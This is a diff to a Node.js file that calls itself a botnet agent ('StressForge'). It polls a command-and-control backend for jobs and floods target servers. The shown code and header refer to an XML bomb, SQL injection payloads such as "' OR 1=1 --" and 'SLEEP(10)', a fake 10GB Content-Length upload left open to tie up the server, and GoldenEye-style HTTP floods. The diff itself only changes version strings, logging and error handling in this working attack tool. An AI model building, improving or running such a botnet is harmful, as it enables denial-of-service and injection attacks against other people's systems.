@@ -1,10 +1,8 @@
 /**
- * STRESSFORGE BOTNET AGENT V9.0 (APOCALYPSE UPDATE)
- * - Feature: XML Bomb (Memory Expansion)
- * - Feature: SQL Injection Flood (DB CPU Stress)
- * - Feature: Big Bang (Disk I/O Stress)
- * - Feature: Ghost Proxy / Infinity / GoldenEye
- * - Host: Render/Railway Free Tier Optimized (460MB Cap)
+ * STRESSFORGE BOTNET AGENT V9.2 (STABILITY UPDATE)
+ * - Fix: Database Write Reliability
+ * - Fix: Latency Calculation Logic
+ * - Host: Render/Railway Free Tier Optimized
  */
 const https = require('https');
 const http = require('http');
@@ -34,7 +32,7 @@ const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TA
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V9.0 APOCALYPSE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V9.2 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -66,7 +64,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V9.0 (APOCALYPSE). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V9.2. Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -77,7 +75,7 @@ const startAttack = (job) => {
 
     activeJob = job;
     const duration = (job.duration && job.duration > 0) ? job.duration : 30;
-    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | XML: ${job.use_xml_bomb?'ON':'OFF'} | SQL: ${job.use_sql_flood?'ON':'OFF'}\x1b[0m`);
+    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | T: ${job.concurrency} | D: ${duration}s\x1b[0m`);
     
     let running = true;
     let totalRequests = 0;
@@ -122,8 +120,7 @@ const startAttack = (job) => {
             currentHeaders['X-Heavy-Load'] = 'true';
             payload = JUNK_DATA;
         } else if (job.use_big_bang) {
-             // Fake Big Upload
-             currentHeaders['Content-Length'] = '10737418240'; // 10GB
+             currentHeaders['Content-Length'] = '10737418240'; 
         }
 
         // --- 3. SQL FLOOD ---
@@ -190,7 +187,7 @@ const startAttack = (job) => {
                      }, handleResponse);
                      req.on('error', handleError);
                      if (payload && !job.use_big_bang) req.write(typeof payload === 'string' ? payload : JSON.stringify(payload));
-                     if (!job.use_big_bang) req.end(); // Big Bang leaves req open
+                     if (!job.use_big_bang) req.end(); 
                  });
                  secureSocket.on('error', handleError);
              });
@@ -241,7 +238,9 @@ const startAttack = (job) => {
                  avg_latency: avgLat,
                  max_latency: jobMaxLatency 
              });
-        } catch(e) { }
+        } catch(e) { 
+            console.log('[ERROR] DB Write Failed. Check Schema.');
+        }
 
         if (duration > 0 && elapsed >= duration) {
             running = false;
